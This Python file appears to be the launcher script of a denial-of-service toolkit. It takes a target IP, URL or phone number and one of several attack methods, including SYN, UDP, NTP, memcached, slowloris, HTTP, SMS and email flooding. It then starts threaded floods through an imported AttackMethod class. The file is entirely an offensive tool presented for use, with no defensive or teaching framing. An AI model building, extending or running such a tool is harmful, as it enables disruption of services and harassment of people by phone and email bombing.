import os
import sys
import argparse
import difflib
SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
ASCII_ART_PATH = os.path.join(SCRIPT_ROOT, '../../ascii.txt')
try:
    with open(ASCII_ART_PATH, 'r', encoding='utf-8') as f:
        ASCII_ART = f.read()
except Exception:
    ASCII_ART = ''
try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)
def print_shortcirc_guide():
    print(f"\033[1;35mDoS Toolkit Options:{RESET}")
    print(f"  -target    (Target ip:port, url or phone)")
    print(f"  -method    (Attack method: SMS (s), EMAIL (e), NTP (n), UDP (u), SYN (sy), ICMP (i), POD (p), MEMCACHED (m), HTTP (h), SLOWLORIS (sl))")
    print(f"  -time      (Attack duration in seconds)")
    print(f"  -threads   (Threads count)")
    print(f"  -h         (Help)")
    print(f"\033[93mTip:{RESET} You can use single dash for all options.\n")
def suggest_shortcirc_option(user_opt, valid_opts):
    matches = difflib.get_close_matches(user_opt, valid_opts, n=3, cutoff=0.5)
    if matches:
        print(f"\033[93mDid you mean:{RESET}")
        for m in matches:
            print(f"  \033[1;32m{m}{RESET}")
    else:
        print(f"\033[93mNo similar options found.{RESET}")
parser = argparse.ArgumentParser(description="Denial-of-service ToolKit", add_help=False)
parser.add_argument('-target', dest='target', type=str, metavar="<IP:PORT, URL, PHONE>", help="Target ip:port, url or phone")
parser.add_argument('-method', dest='method', type=str, metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>", help="Attack method")
parser.add_argument('-time', dest='time', type=int, default=10, metavar="<time>", help="time in secounds")
parser.add_argument('-threads', dest='threads', type=int, default=3, metavar="<threads>", help="threads count (1-200)")
parser.add_argument('-h', '--help', action='store_true', help='Show help message and exit')
METHOD_ALIASES = {
    "SMS": "s",
    "EMAIL": "e",
    "NTP": "n",
    "UDP": "u",
    "SYN": "sy",
    "ICMP": "i",
    "POD": "p",
    "MEMCACHED": "m",
    "HTTP": "h",
    "SLOWLORIS": "sl",
}
SHORT_TO_METHOD = {v: k for k, v in METHOD_ALIASES.items()}
known_opts = ['-target', '-method', '-time', '-threads', '-h']
for arg in sys.argv[1:]:
    if arg.startswith('-') and arg not in known_opts and not arg.startswith('--'):
        print(f"\033[1;31m✗ Error:{RESET} \033[93mUnknown option '{arg}'.{RESET}\n")
        suggest_shortcirc_option(arg, known_opts)
        print()
        print_shortcirc_guide()
        sys.exit(2)
args = parser.parse_args()
if args.help:
    print_shortcirc_guide()
    sys.exit(0)
threads = args.threads
time = args.time
method = str(args.method).upper() if args.method else None
target = args.target
if method in SHORT_TO_METHOD:
    method = SHORT_TO_METHOD[method]
if __name__ == "__main__":
    if ASCII_ART:
        print(ASCII_ART)
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()